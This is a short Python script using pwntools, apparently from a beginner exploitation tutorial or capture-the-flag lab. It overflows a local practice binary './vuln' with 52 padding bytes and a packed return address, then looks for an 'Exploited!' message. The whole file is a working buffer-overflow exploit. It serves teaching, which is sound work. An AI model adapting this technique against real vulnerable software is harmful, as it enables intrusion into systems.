from pwn import *            # This is how we import pwntools
p = process('./vuln')        # We're starting a new process
payload = b'A' * 52
payload += p32(0x080491c3)   # Use pwntools to pack it
log.info(p.clean())          # Receive all the text
p.sendline(payload)
log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
